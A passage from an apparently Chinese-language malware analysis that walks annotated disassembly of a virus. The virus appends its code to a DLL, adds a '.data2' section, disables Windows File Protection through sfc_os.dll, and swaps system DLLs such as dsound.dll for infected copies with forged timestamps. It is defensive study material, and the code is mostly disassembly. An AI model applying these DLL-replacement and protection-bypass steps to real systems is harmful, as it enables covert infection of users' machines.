00402191   . |6A 00         push    0                            ; |pOffsetHi = NULL
00402193   . |6A 00         push    0                            ; |OffsetLo = 0
00402195   . |8B8D D4FEFFFF mov     ecx, dword ptr [ebp-12C]     ; |
0040219B   . |51            push    ecx                          ; |hFile
0040219C   . |FF15 28304000 call    dword ptr [<&KERNEL32.SetFilePoi>; \指针移至 New.dll 末尾
004021A2   . |C785 94FDFFFF>mov     dword ptr [ebp-26C], 0
004021AC   . |EB 0F         jmp     short 004021BD
004021AE   > |8B95 94FDFFFF mov     edx, dword ptr [ebp-26C]
004021B4   . |83C2 01       add     edx, 1
004021B7   . |8995 94FDFFFF mov     dword ptr [ebp-26C], edx
004021BD   > |8B85 94FDFFFF mov     eax, dword ptr [ebp-26C]
004021C3   . |3B85 70FDFFFF cmp     eax, dword ptr [ebp-290]
004021C9   . |7D 27         jge     short 004021F2               ;  读取完毕则跳走
004021CB   . |6A 00         push    0                            ; /pOverlapped = NULL
004021CD   . |8D8D C0FDFFFF lea     ecx, dword ptr [ebp-240]     ; |
004021D3   . |51            push    ecx                          ; |pBytesWritten
004021D4   . |6A 01         push    1                            ; |nBytesToWrite = 1
004021D6   . |8B95 D8FDFFFF mov     edx, dword ptr [ebp-228]     ; |
004021DC   . |0395 94FDFFFF add     edx, dword ptr [ebp-26C]     ; |
004021E2   . |52            push    edx                          ; |Buffer
004021E3   . |8B85 D4FEFFFF mov     eax, dword ptr [ebp-12C]     ; |
004021E9   . |50            push    eax                          ; |hFile
004021EA   . |FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \将病毒原程序数据写入 New.dll 尾部
004021F0   . ^|EB BC        jmp     short 004021AE               ;  循环读取,写入
```

### 14. 连续在 `New.dll` 尾部写入数据

代码：

```
00402237   .  6A 00         push    0                            ; /pOverlapped = NULL
00402239   .  8D8D C0FDFFFF lea     ecx, dword ptr [ebp-240]     ; |
0040223F   .  51            push    ecx                          ; |pBytesWritten
00402240   .  6A 04         push    4                            ; |nBytesToWrite = 4
00402242   .  8D95 80FDFFFF lea     edx, dword ptr [ebp-280]     ; |
00402248   .  52            push    edx                          ; |Buffer
00402249   .  8B85 D4FEFFFF mov     eax, dword ptr [ebp-12C]     ; |
0040224F   .  50            push    eax                          ; |hFile
00402250   .  FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \WriteFile
00402256   .  6A 00         push    0                            ; /pOverlapped = NULL
00402258   .  8D8D C0FDFFFF lea     ecx, dword ptr [ebp-240]     ; |
0040225E   .  51            push    ecx                          ; |pBytesWritten
0040225F   .  6A 04         push    4                            ; |nBytesToWrite = 4
00402261   .  8D95 C4FDFFFF lea     edx, dword ptr [ebp-23C]     ; |
00402267   .  52            push    edx                          ; |Buffer
00402268   .  8B85 D4FEFFFF mov     eax, dword ptr [ebp-12C]     ; |
0040226E   .  50            push    eax                          ; |hFile
0040226F   .  FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \WriteFile
00402275   .  6A 00         push    0                            ; /pOverlapped = NULL
00402277   .  8D8D C0FDFFFF lea     ecx, dword ptr [ebp-240]     ; |
0040227D   .  51            push    ecx                          ; |pBytesWritten
0040227E   .  6A 04         push    4                            ; |nBytesToWrite = 4
00402280   .  8D95 C4FDFFFF lea     edx, dword ptr [ebp-23C]     ; |
00402286   .  52            push    edx                          ; |Buffer
00402287   .  8B85 D4FEFFFF mov     eax, dword ptr [ebp-12C]     ; |
0040228D   .  50            push    eax                          ; |hFile
0040228E   .  FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \WriteFile
00402294   .  6A 00         push    0                            ; /pOverlapped = NULL
00402296   .  8D8D C0FDFFFF lea     ecx, dword ptr [ebp-240]     ; |
0040229C   .  51            push    ecx                          ; |pBytesWritten
0040229D   .  6A 04         push    4                            ; |nBytesToWrite = 4
0040229F   .  8D95 C4FDFFFF lea     edx, dword ptr [ebp-23C]     ; |
004022A5   .  52            push    edx                          ; |Buffer
004022A6   .  8B85 D4FEFFFF mov     eax, dword ptr [ebp-12C]     ; |
004022AC   .  50            push    eax                          ; |hFile
004022AD   .  FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \WriteFile
004022B3   .  6A 00         push    0                            ; /pOverlapped = NULL
004022B5   .  8D8D C0FDFFFF lea     ecx, dword ptr [ebp-240]     ; |
004022BB   .  51            push    ecx                          ; |pBytesWritten
004022BC   .  6A 04         push    4                            ; |nBytesToWrite = 4
004022BE   .  8D95 C4FDFFFF lea     edx, dword ptr [ebp-23C]     ; |
004022C4   .  52            push    edx                          ; |Buffer
004022C5   .  8B85 D4FEFFFF mov     eax, dword ptr [ebp-12C]     ; |
004022CB   .  50            push    eax                          ; |hFile
004022CC   .  FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \WriteFile
004022D2   .  6A 00         push    0                            ; /pOverlapped = NULL
004022D4   .  8D8D C0FDFFFF lea     ecx, dword ptr [ebp-240]     ; |
004022DA   .  51            push    ecx                          ; |pBytesWritten
004022DB   .  6A 04         push    4                            ; |nBytesToWrite = 4
004022DD   .  8D95 C4FDFFFF lea     edx, dword ptr [ebp-23C]     ; |
004022E3   .  52            push    edx                          ; |Buffer
004022E4   .  8B85 D4FEFFFF mov     eax, dword ptr [ebp-12C]     ; |
004022EA   .  50            push    eax                          ; |hFile
004022EB   .  FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \WriteFile
```

### 15. 将形如 `[1001,1028]` 的整型数据写入 `New.dll` 尾部

代码：



```
0040232A   > /8B8D 94FDFFFF mov     ecx, dword ptr [ebp-26C]
00402330   . |83C1 01       add     ecx, 1
00402333   . |898D 94FDFFFF mov     dword ptr [ebp-26C], ecx
00402339   > |83BD 94FDFFFF>cmp     dword ptr [ebp-26C], 28
00402340   . |0F8F 82000000 jg      004023C8
00402346   . |8B95 94FDFFFF mov     edx, dword ptr [ebp-26C]
0040234C   . |81C2 00100000 add     edx, 1000
00402352   . |52           push    edx                       ; /<%04x>
00402353   . |68 A4404000  push    004040A4                  ; |format = "%04x"
00402358   . |8D85 CCFDFFFF lea     eax, dword ptr [ebp-234]    ; |
0040235E   . |50           push    eax                       ; |s
0040235F   . |FF15 A0304000 call    dword ptr [<&MSVCRT.sprintf>]    ; \\形如[1001,1028]的整形数据
00402365   . |83C4 0C       add     esp, 0C
00402368   . |6A 00         push    0                         ; /pOverlapped = NULL
0040236A   . |8D8D C0FDFFFF lea     ecx, dword ptr [ebp-240]    ; |
00402370   . |51           push    ecx                       ; |pBytesWritten
00402371   . |6A 04         push    4                         ; |nBytesToWrite = 4
00402373   . |8D95 CCFDFFFF lea     edx, dword ptr [ebp-234]    ; |
00402379   . |52           push    edx                       ; |Buffer
0040237A   . |8B85 D4FEFFFF mov     eax, dword ptr [ebp-12C]    ; |
00402380   . |50           push    eax                       ; |hFile
00402381   . |FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \\WriteFile
00402387   . |6A 00         push    0                         ; /pOverlapped = NULL
00402389   . |8D8D C0FDFFFF lea     ecx, dword ptr [ebp-240]    ; |
0040238F   . |51           push    ecx                       ; |pBytesWritten
00402390   . |6A 04         push    4                         ; |nBytesToWrite = 4
00402392   . |8D95 D4FDFFFF lea     edx, dword ptr [ebp-22C]    ; |
00402398   . |52           push    edx                       ; |Buffer
00402399   . |8B85 D4FEFFFF mov     eax, dword ptr [ebp-12C]    ; |
0040239F   . |50           push    eax                       ; |hFile
004023A0   . |FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \\WriteFile
004023A6   . |6A 00         push    0                         ; /pOverlapped = NULL
004023A8   . |8D8D C0FDFFFF lea     ecx, dword ptr [ebp-240]    ; |
004023AE   . |51           push    ecx                       ; |pBytesWritten
004023AF   . |6A 08         push    8                         ; |nBytesToWrite = 8
004023B1   . |68 A4424000  push    004042A4                  ; |Buffer = virus.004042A4
004023B6   . |8B95 D4FEFFFF mov     edx, dword ptr [ebp-12C]    ; |
004023BC   . |52           push    edx                       ; |hFile
004023BD   . |FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \\WriteFile
004023C3   .^\\E9 62FFFFFF    jmp     0040232A
```

### 16. 新建一个区段.data2,并修改 NumberOfSections

代码：



```
004023C8   >  C785 94FDFFFF>mov     dword ptr \[ebp-26C\], 0
004023D2   .  EB 0F          jmp     short 004023E3
004023D4   >  8B85 94FDFFFF mov     eax, dword ptr \[ebp-26C\]
004023DA   .  83C0 01       add     eax, 1
004023DD   .  8985 94FDFFFF mov     dword ptr \[ebp-26C\], eax
004023E3   >  8B8D 8CFDFFFF mov     ecx, dword ptr \[ebp-274\]
004023E9   .  51            push    ecx
004023EA   .  8B95 70FDFFFF mov     edx, dword ptr \[ebp-290\]
004023F0   .  52            push    edx
004023F1   .  E8 FAEFFFFF   call    004013F0
004023F6   .  83C4 08       add     esp, 8
004023F9   .  D1E0          shl     eax, 1
004023FB   .  2B85 70FDFFFF sub     eax, dword ptr \[ebp-290\]
00402401   .  83E8 20       sub     eax, 20
00402404   .  3985 94FDFFFF cmp     dword ptr \[ebp-26C\], eax
0040240A   .  7D 1F         jge     short 0040242B
0040240C   .  6A 00         push    0                              ; /pOverlapped = NULL
0040240E   .  8D85 C0FDFFFF lea     eax, dword ptr \[ebp-240\]      ; |
00402414   .  50            push    eax                             ; |pBytesWritten
00402415   .  6A 02         push    2                              ; |nBytesToWrite = 2
00402417   .  68 A0424000   push    004042A0                       ; |Buffer = virus.004042A0
0040241C   .  8B8D D4FEFFFF mov     ecx, dword ptr \[ebp-12C\]     ; |
00402422   .  51            push    ecx                             ; |hFile
00402423   .  FF15 04304000 call    dword ptr \[<&KERNEL32.WriteFile>>; \\WriteFile
00402429   .^ EB A9         jmp     short 004023D4
0040242B   >  BF 50404000   mov     edi, 00404050                 ;   ASCII ".data2"
00402430   .  8D55 D8       lea     edx, dword ptr \[ebp-28\]
00402433   .  83C9 FF       or      ecx, FFFFFFFF
00402436   .  33C0          xor     eax, eax
00402438   .  F2:AE         repne   scas byte ptr es:\[edi\]
0040243A   .  F7D1          not     ecx
0040243C   .  2BF9          sub     edi, ecx
0040243E   .  8BF7          mov     esi, edi
00402440   .  8BC1          mov     eax, ecx
00402442   .  8BFA          mov     edi, edx
00402444   .  C1E9 02       shr     ecx, 2
00402447   .  F3:A5         rep     movs dword ptr es:\[edi\], dword p>
00402449   .  8BC8          mov     ecx, eax
0040244B   .  83E1 03       and     ecx, 3
0040244E   .  F3:A4         rep     movs byte ptr es:\[edi\], byte ptr>
00402450   .  8B8D ACFDFFFF mov     ecx, dword ptr \[ebp-254\]
00402456   .  038D A8FDFFFF add     ecx, dword ptr \[ebp-258\]
0040245C   .  894D EC       mov     dword ptr \[ebp-14\], ecx
0040245F   .  8B95 68FCFFFF mov     edx, dword ptr \[ebp-398\]
00402465   .  52            push    edx
00402466   .  8B85 70FDFFFF mov     eax, dword ptr \[ebp-290\]
0040246C   .  50            push    eax
0040246D   .  E8 7EEFFFFF   call    004013F0
00402472   .  83C4 08       add     esp, 8
00402475   .  8945 E0       mov     dword ptr \[ebp-20\], eax
00402478   .  8B8D 8CFDFFFF mov     ecx, dword ptr \[ebp-274\]
0040247E   .  51            push    ecx
0040247F   .  8B95 70FDFFFF mov     edx, dword ptr \[ebp-290\]
00402485   .  52            push    edx
00402486   .  E8 65EFFFFF   call    004013F0
0040248B   .  83C4 08       add     esp, 8
0040248E   .  D1E0          shl     eax, 1
00402490   .  8945 E8       mov     dword ptr \[ebp-18\], eax
00402493   .  C745 FC 60000>mov     dword ptr \[ebp-4\], E0000060
0040249A   .  6A 00         push    0                              ; /Origin = FILE\_BEGIN
0040249C   .  6A 00         push    0                              ; |pOffsetHi = NULL
0040249E   .  8B85 6CFDFFFF mov     eax, dword ptr \[ebp-294\]     ; |
004024A4   .  6BC0 28       imul    eax, eax, 28                  ; |
004024A7   .  8B8D 90FDFFFF mov     ecx, dword ptr \[ebp-270\]     ; |
004024AD   .  8D9401 F80000>lea     edx, dword ptr \[ecx+eax+F8\]   ; |
004024B4   .  52            push    edx                             ; |OffsetLo
004024B5   .  8B85 D4FEFFFF mov     eax, dword ptr \[ebp-12C\]     ; |
004024BB   .  50            push    eax                             ; |hFile
004024BC   .  FF15 28304000 call    dword ptr \[<&KERNEL32.SetFilePoi>; \\将指针移至 New.dll 开头 0x280 字节后
004024C2   .  6A 00         push    0                              ; /pOverlapped = NULL
004024C4   .  8D8D C0FDFFFF lea     ecx, dword ptr \[ebp-240\]     ; |
004024CA   .  51            push    ecx                             ; |pBytesWritten
004024CB   .  6A 28         push    28                             ; |nBytesToWrite = 28 (40.)
004024CD   .  8D55 D8       lea     edx, dword ptr \[ebp-28\]      ; |
004024D0   .  52            push    edx                             ; |Buffer
004024D1   .  8B85 D4FEFFFF mov     eax, dword ptr \[ebp-12C\]     ; |
004024D7   .  50            push    eax                             ; |hFile
004024D8   .  FF15 04304000 call    dword ptr \[<&KERNEL32.WriteFile>>; \\在最后一个区段后写入数据,准备新建一个区段
004024DE   .  8B8D 68FCFFFF mov     ecx, dword ptr \[ebp-398\]
004024E4   .  51            push    ecx
004024E5   .  8B95 70FDFFFF mov     edx, dword ptr \[ebp-290\]
004024EB   .  52            push    edx
004024EC   .  E8 FFEEFFFF   call    004013F0
004024F1   .  83C4 08       add     esp, 8
004024F4   .  8B8D 2CFEFFFF mov     ecx, dword ptr \[ebp-1D4\]
004024FA   .  03C8          add     ecx, eax
004024FC   .  898D 84FDFFFF mov     dword ptr \[ebp-27C\], ecx
00402502   .  8B95 8CFDFFFF mov     edx, dword ptr \[ebp-274\]
00402508   .  52            push    edx
00402509   .  8B85 70FDFFFF mov     eax, dword ptr \[ebp-290\]
0040250F   .  50            push    eax
00402510   .  E8 DBEEFFFF   call    004013F0
00402515   .  83C4 08       add     esp, 8
00402518   .  8B8D F8FDFFFF mov     ecx, dword ptr \[ebp-208\]
0040251E   .  8D1441        lea     edx, dword ptr \[ecx+eax\*2\]
00402521   .  8995 74FDFFFF mov     dword ptr \[ebp-28C\], edx
00402527   .  6A 00         push    0                              ; /Origin = FILE\_BEGIN
00402529   .  6A 00         push    0                              ; |pOffsetHi = NULL
0040252B   .  8B85 90FDFFFF mov     eax, dword ptr \[ebp-270\]     ; |
00402531   .  50            push    eax                             ; |OffsetLo
00402532   .  8B8D D4FEFFFF mov     ecx, dword ptr \[ebp-12C\]     ; |
00402538   .  51            push    ecx                             ; |hFile
00402539   .  FF15 28304000 call    dword ptr \[<&KERNEL32.SetFilePoi>; \\将指针移至 New.dll 的 PE 头
0040253F   .  C785 ACFEFFFF>mov     dword ptr \[ebp-154\], 0
00402549   .  C785 B0FEFFFF>mov     dword ptr \[ebp-150\], 0
00402553   .  8B95 74FDFFFF mov     edx, dword ptr \[ebp-28C\]
00402559   .  8995 F8FDFFFF mov     dword ptr \[ebp-208\], edx
0040255F   .  8B85 84FDFFFF mov     eax, dword ptr \[ebp-27C\]
00402565   .  8985 2CFEFFFF mov     dword ptr \[ebp-1D4\], eax
0040256B   .  8B8D 6CFDFFFF mov     ecx, dword ptr \[ebp-294\]
00402571   .  83C1 01       add     ecx, 1
00402574   .  66:898D E2FDF>mov     word ptr \[ebp-21E\], cx
0040257B   .  8B55 E4       mov     edx, dword ptr \[ebp-1C\]
0040257E   .  8995 04FEFFFF mov     dword ptr \[ebp-1FC\], edx
00402584   .  6A 00         push    0                              ; /pOverlapped = NULL
00402586   .  8D85 C0FDFFFF lea     eax, dword ptr \[ebp-240\]     ; |
0040258C   .  50            push    eax                             ; |pBytesWritten
0040258D   .  68 F8000000   push    0F8                            ; |nBytesToWrite = F8 (248.)
00402592   .  8D8D DCFDFFFF lea     ecx, dword ptr \[ebp-224\]     ; |
00402598   .  51            push    ecx                             ; |Buffer
00402599   .  8B95 D4FEFFFF mov     edx, dword ptr \[ebp-12C\]     ; |
0040259F   .  52            push    edx                             ; |hFile
004025A0   .  FF15 04304000 call    dword ptr \[<&KERNEL32.WriteFile>>; \\改写 PE 头的 NumberOfSections
004025A6   .  68 94404000   push    00404094                       ; /format = TAB,TAB,"ok.........!",LF,""
004025AB   .  FF15 9C304000 call    dword ptr \[<&MSVCRT.printf>\]  ; \\Yes. As you see, ok... :)
004025B1   .  83C4 04       add     esp, 4
004025B4   .  6A 02         push    2                              ; /Origin = FILE\_END
004025B6   .  6A 00         push    0                              ; |pOffsetHi = NULL
004025B8   .  6A 00         push    0                              ; |OffsetLo = 0
004025BA   .  8B85 D4FEFFFF mov     eax, dword ptr \[ebp-12C\]     ; |
004025C0   .  50            push    eax                             ; |hFile
004025C1   .  FF15 28304000 call    dword ptr \[<&KERNEL32.SetFilePoi>; \\指针移到 New.dll 末尾
004025C7   .  C785 78FDFFFF>mov     dword ptr \[ebp-288\], 1
004025D1   .  6A 00         push    0                              ; /pOverlapped = NULL
004025D3   .  8D8D C0FDFFFF lea     ecx, dword ptr \[ebp-240\]     ; |
004025D9   .  51            push    ecx                             ; |pBytesWritten
004025DA   .  6A 04         push    4                              ; |nBytesToWrite = 4
004025DC   .  8D95 78FDFFFF lea     edx, dword ptr \[ebp-288\]     ; |
004025E2   .  52            push    edx                             ; |Buffer
004025E3   .  8B85 D4FEFFFF mov     eax, dword ptr \[ebp-12C\]     ; |
004025E9   .  50            push    eax                             ; |hFile
004025EA   .  FF15 04304000 call    dword ptr \[<&KERNEL32.WriteFile>>; \\WriteFile
004025F0   .  8B8D 7CFDFFFF mov     ecx, dword ptr \[ebp-284\]
004025F6   .  51            push    ecx                             ; /hObject
004025F7   .  FF15 00304000 call    dword ptr \[<&KERNEL32.CloseHandl>; \\CloseHandle
004025FD   .  8B95 D4FEFFFF mov     edx, dword ptr \[ebp-12C\]
00402603   .  52            push    edx                             ; /hObject
00402604   .  FF15 00304000 call    dword ptr \[<&KERNEL32.CloseHandl>; \\CloseHandle
```



## 17.关闭系统文件保护

```
00401410    $  55             push    ebp
00401411    .  8BEC          mov     ebp, esp
00401413    .  6A FF         push    -1
00401415    .  68 B8304000   push    004030B8
0040141A    .  68 902B4000   push    <jmp.&MSVCRT.\_except\_handler3>   ;  SE 处理程序安装
0040141F    .  64:A1 0000000>mov     eax, dword ptr fs:\[0\]
00401425    .  50            push    eax
00401426    .  64:8925 00000>mov     dword ptr fs:\[0\], esp
0040142D    .  81EC 20020000 sub     esp, 220
00401433    .  53            push    ebx
00401434    .  56            push    esi
00401435    .  57            push    edi
00401436    .  8965 E8       mov     dword ptr \[ebp-18\], esp
00401439    .  A1 44404000   mov     eax, dword ptr \[404044\]
0040143E    .  8985 D0FDFFFF mov     dword ptr \[ebp-230\], eax
00401444    .  8B0D 48404000 mov     ecx, dword ptr \[404048\]
0040144A    .  898D D4FDFFFF mov     dword ptr \[ebp-22C\], ecx
00401450    .  66:8B15 4C404>mov     dx, word ptr \[40404C\]
00401457    .  66:8995 D8FDF>mov     word ptr \[ebp-228\], dx
0040145E    .  A0 4E404000   mov     al, byte ptr \[40404E\]
00401463    .  8885 DAFDFFFF mov     byte ptr \[ebp-226\], al
00401469    .  8D8D D0FDFFFF lea     ecx, dword ptr \[ebp-230\]
0040146F    .  51            push    ecx                           ; /FileName
00401470    .  FF15 60304000 call    dword ptr \[<&KERNEL32.LoadLibrar>; \\加载 sfc\_os.dll
00401476    .  8BF0         mov     esi, eax
00401478    .  8975 E4       mov     dword ptr \[ebp-1C\], esi
0040147B    .  33DB         xor     ebx, ebx
0040147D    .  3BF3         cmp     esi, ebx
0040147F    .  74 76        je      short 004014F7
00401481    .  66:899D DCFDF>mov    word ptr \[ebp-224\], bx
00401488    .  B9 80000000   mov     ecx, 80
0040148D    .  33C0         xor     eax, eax
0040148F    .  8DBD DEFDFFFF lea     edi, dword ptr \[ebp-222\]
00401495    .  F3:AB        rep     stos dword ptr es:\[edi\]
00401497    .  66:AB        stos    word ptr es:\[edi\]
00401499    .  68 02010000   push    102                           ; /WideBufSize = 102 (258.)
0040149E    .  8D95 DCFDFFFF lea     edx, dword ptr \[ebp-224\]       ; |
004014A4    .  52            push    edx                           ; |WideCharBuf
004014A5    .  8B55 08       mov     edx, dword ptr \[ebp+8\]       ; |
004014A8    .  8BFA         mov     edi, edx                      ; |
004014AA    .  83C9 FF       or      ecx, FFFFFFFF                 ; |
004014AD    .  33C0         xor     eax, eax                      ; |
004014AF    .  F2:AE        repne   scas byte ptr es:\[edi\]       ; |
004014B1    .  F7D1         not     ecx                           ; |
004014B3    .  49            dec     ecx                           ; |
004014B4    .  51            push    ecx                           ; |StringSize
004014B5    .  52            push    edx                           ; |StringToMap
004014B6    .  53            push    ebx                           ; |Options => 0
004014B7    .  53            push    ebx                           ; |CodePage => CP\_ACP
004014B8    .  FF15 5C304000 call    dword ptr \[<&KERNEL32.MultiByteT>; \\%windir%\\system32\\dsound.dll 转为 Unicode 编码
004014BE    .  6A 05        push    5                             ; /ProcNameOrOrdinal = #5
004014C0    .  56            push    esi                           ; |hModule
004014C1    .  FF15 58304000 call    dword ptr \[<&KERNEL32.GetProcAdd>; \\取 sfc\_os.dll 的 5 号函数的地址
004014C7    .  895D FC       mov     dword ptr \[ebp-4\], ebx
004014CA    .  6A FF        push    -1
004014CC    .  8D8D DCFDFFFF lea     ecx, dword ptr \[ebp-224\]
004014D2    .  51            push    ecx
004014D3    .  53            push    ebx
004014D4    .  FFD0         call    eax                           ;  调用 sfc\_os.dll 的 5 号函数,解除系统文件保护
004014D6    .  C745 FC FFFFF>mov    dword ptr \[ebp-4\], -1
004014DD    .  EB 11        jmp     short 004014F0
004014DF    .  83C8 FF       or      eax, FFFFFFFF
004014E2    .  C3            retn
004014E3    .  8B65 E8       mov     esp, dword ptr \[ebp-18\]
004014E6    .  C745 FC FFFFF>mov    dword ptr \[ebp-4\], -1
004014ED    .  8B75 E4       mov     esi, dword ptr \[ebp-1C\]
004014F0    >  56            push    esi                           ; /hLibModule
004014F1    .  FF15 54304000 call    dword ptr \[<&KERNEL32.FreeLibrar>; \\FreeLibrary
004014F7    >  8B4D F0       mov     ecx, dword ptr \[ebp-10\]
004014FA    .  64:890D 00000>mov    dword ptr fs:\[0\], ecx
00401501    .  5F            pop     edi
00401502    .  5E            pop     esi
00401503    .  5B            pop     ebx
00401504    .  8BE5          mov     esp, ebp
00401506    .  5D            pop     ebp
00401507    .  C3            retn
```

## 18.在 `dsound.dll` 文件名后面加上.开机时间数

```
0040260A    .  C685 D8FEFFFF>mov     byte ptr \[ebp-128\], 0
00402611    .  B9 3F000000   mov     ecx, 3F
00402616    .  33C0         xor     eax, eax
00402618    .  8DBD D9FEFFFF lea     edi, dword ptr \[ebp-127\]
0040261E    .  F3:AB        rep     stos dword ptr es:\[edi\]
00402620    .  66:AB        stos    word ptr es:\[edi\]
00402622    .  AA            stos    byte ptr es:\[edi\]
00402623    .  FF15 78304000 call    dword ptr \[<&KERNEL32.GetTickCou>; \[返回开机时间数
00402629    .  50            push    eax                           ; /<%d>
0040262A    .  8B45 08       mov     eax, dword ptr \[ebp+8\]       ; |
0040262D    .  50            push    eax                           ; |<%s>
0040262E    .  68 74404000   push    00404074                      ; |format = "%s.%d"
00402633    .  8D8D D8FEFFFF lea     ecx, dword ptr \[ebp-128\]     ; |
00402639    .  51            push    ecx                           ; |s
0040263A    .  FF15 A0304000 call    dword ptr \[<&MSVCRT.sprintf>\]    ; \\在 dsound.dll 文件名后面加上.开机时间数
```

## 19.备份 `dsound.dll`，将 `New.dll` 复制为 `dsound.dll`，伪装现在的 `dsound.dll`

```
004015C0  /$  56             push    esi
004015C1  |.  8B7424 08     mov     esi, dword ptr \[esp+8\]
004015C5  |.  57             push    edi
004015C6  |.  56             push    esi
004015C7  |.  E8 44FEFFFF    call    00401410                      ;  关闭系统文件保护
004015CC  |.  8B7C24 18      mov     edi, dword ptr \[esp+18\]
004015D0  |.  83C4 04        add     esp, 4
004015D3  |.  6A 01          push    1                             ; /Flags = REPLACE\_EXISTING
004015D5  |.  57             push    edi                           ; |NewName
004015D6  |.  56             push    esi                           ; |ExistingName
004015D7  |.  FF15 74304000 call    dword ptr \[<&KERNEL32.MoveFileEx>; \\将%windir%\\system32\\dsound.dll 重命名为 dsound.dll+开机时间数
004015DD  |.  8B4424 10      mov     eax, dword ptr \[esp+10\]
004015E1  |.  6A 00          push    0                             ; /FailIfExists = FALSE
004015E3  |.  56             push    esi                           ; |NewFileName
004015E4  |.  50             push    eax                           ; |ExistingFileName
004015E5  |.  FF15 70304000 call    dword ptr \[<&KERNEL32.CopyFileA>>; \\将%windir%\\system32\\New.dll 重命名为 dsound.dll
004015EB  |.  56             push    esi
004015EC  |.  57             push    edi
004015ED  |.  E8 1EFFFFFF    call    00401510
004015F2  |.  83C4 08        add     esp, 8
004015F5  |.  5F             pop     edi
004015F6  |.  5E             pop     esi
004015F7  \\.  C3             retn
```



00401510 `/$` `83EC 18` `sub` `esp`, `18`
00401513 `|.` `53` `push` `ebx`
00401514 `|.` `8B4424 20` `mov` `eax`, `dword ptr [esp+20]`
00401518 `|.` `56` `push` `esi`
00401519 `|.` `33F6` `xor` `esi`, `esi`
0040151B `|.` `8B1D 08304000` `mov` `ebx`, `dword ptr [<&KERNEL32.Creat>;  kernel32.CreateFileA`
00401521 `|.` `57` `push` `edi`
00401522 `|.` `56` `push` `esi` `; /hTemplateFile => NULL`
00401523 `|.` `68 80000000` `push` `80` `; |Attributes = NORMAL`
00401528 `|.` `6A 03` `push` `3` `; |Mode = OPEN_EXISTING`
0040152A `|.` `56` `push` `esi` `; |pSecurity => NULL`
0040152B `|.` `6A 01` `push` `1` `; |ShareMode = FILE_SHARE_READ`
0040152D `|.` `68 00000080` `push` `80000000` `; |Access = GENERIC_READ`
00401532 `|.` `50` `push` `eax` `; |FileName`
00401533 `|.` `FFD3` `call` `ebx` `; \打开 dsound.dll.28802485`
00401535 `|.` `8B4C24 2C` `mov` `ecx`, `dword ptr [esp+2C]`
00401539 `|.` `56` `push` `esi` `; /hTemplateFile => NULL`
0040153A `|.` `68 80000000` `push` `80` `; |Attributes = NORMAL`
0040153F `|.` `6A 03` `push` `3` `; |Mode = OPEN_EXISTING`
00401541 `|.` `56` `push` `esi` `; |pSecurity => NULL`
00401542 `|.` `6A 01` `push` `1` `; |ShareMode = FILE_SHARE_READ`
00401544 `|.` `68 00000010` `push` `10000000` `; |Access = GENERIC_ALL`
00401549 `|.` `51` `push` `ecx` `; |FileName`
0040154A `|.` `8BF8` `mov` `edi`, `eax` `; |`
0040154C `|.` `FFD3` `call` `ebx` `; \打开 dsound.dll,即原来的 New.dll`
0040154E `|.` `8BD8` `mov` `ebx`, `eax`
00401550 `|.` `8D5424 0C` `lea` `edx`, `dword ptr [esp+C]`
00401554 `|.` `8D4424 14` `lea` `eax`, `dword ptr [esp+14]`
00401558 `|.` `52` `push` `edx` `; /pLastWrite`
00401559 `|.` `8D4C24 20` `lea` `ecx`, `dword ptr [esp+20]` `; |`
0040155D `|.` `50` `push` `eax` `; |pLastAccess`
0040155E `|.` `51` `push` `ecx` `; |pCreationTime`
0040155F `|.` `57` `push` `edi` `; |hFile`
00401560 `|.` `897424 2C` `mov` `dword ptr [esp+2C]`, `esi` `; |`
00401564 `|.` `897424 30` `mov` `dword ptr [esp+30]`, `esi` `; |`
00401568 `|.` `897424 24` `mov` `dword ptr [esp+24]`, `esi` `; |`
0040156C `|.` `897424 28` `mov` `dword ptr [esp+28]`, `esi` `; |`
00401570 `|.` `897424 1C` `mov` `dword ptr [esp+1C]`, `esi` `; |`
00401574 `|.` `897424 20` `mov` `dword ptr [esp+20]`, `esi` `; |`
00401578 `|.` `FF15 6C304000` `call` `dword ptr [<&KERNEL32.GetFileTim>; \检索原来的 dsound.dll 的时间`
0040157E `|.` `8D5424 0C` `lea` `edx`, `dword ptr [esp+C]`
00401582 `|.` `8D4424 14` `lea` `eax`, `dword ptr [esp+14]`
00401586 `|.` `52` `push` `edx` `; /pLastWrite`
00401587 `|.` `8D4C24 20` `lea` `ecx`, `dword ptr [esp+20]` `; |`
0040158B `|.` `50` `push` `eax` `; |pLastAccess`
0040158C `|.` `51` `push` `ecx` `; |pCreationTime`
0040158D `|.` `53` `push` `ebx` `; |hFile`
0040158E `|.` `FF15 68304000` `call` `dword ptr [<&KERNEL32.SetFileTim>; \创建和修改时间设定为原来的时间,伪装`
00401594 `|.` `85C0` `test` `eax`, `eax`
00401596 `|.` `75 06` `jnz` `short 0040159E`
00401598 `|.` `FF15 64304000` `call` `dword ptr [<&KERNEL32.GetLastErr>; [GetLastError`
0040159E `|>` `8B35 00304000` `mov` `esi`, `dword ptr [<&KERNEL32.Close>;  kernel32.CloseHandle`
004015A4 `|.` `53` `push` `ebx` `; /hObject`
004015A5 `|.` `FFD6` `call` `esi` `; \CloseHandle`
004015A7 `|.` `57` `push` `edi` `; /hObject`
004015A8 `|.` `FFD6` `call` `esi` `; \CloseHandle`
004015AA `|.` `5F` `pop` `edi`
004015AB `|.` `5E` `pop` `esi`
004015AC `|.` `5B` `pop` `ebx`
004015AD `|.` `83C4 18` `add` `esp`, `18`
004015B0 `\. `C3` `retn`

`ddraw.dll` 的修改同 `dsound.dll`。

`comres.dll` 的修改同 `dsound.dll`。

`ksuser.dll` 的修改同 `dsound.dll`。

`olepro32.dll` 的修改同 `dsound.dll`。

创建文件 `%windir%\\system32\\font01.dll`

代码:

00402A71 `|.` `51` `push` `ecx`
00402A72 `|.` `FFD5` `call` `ebp` `;  检索系统文件夹路径`
00402A74 `|.` `8D9424 340800>` `lea` `edx`, `dword ptr [esp+834]`
00402A7B `|.` `68 3C414000` `push` `0040413C` `;  ASCII "\font01.dll"`
00402A80 `|.` `52` `push` `edx`
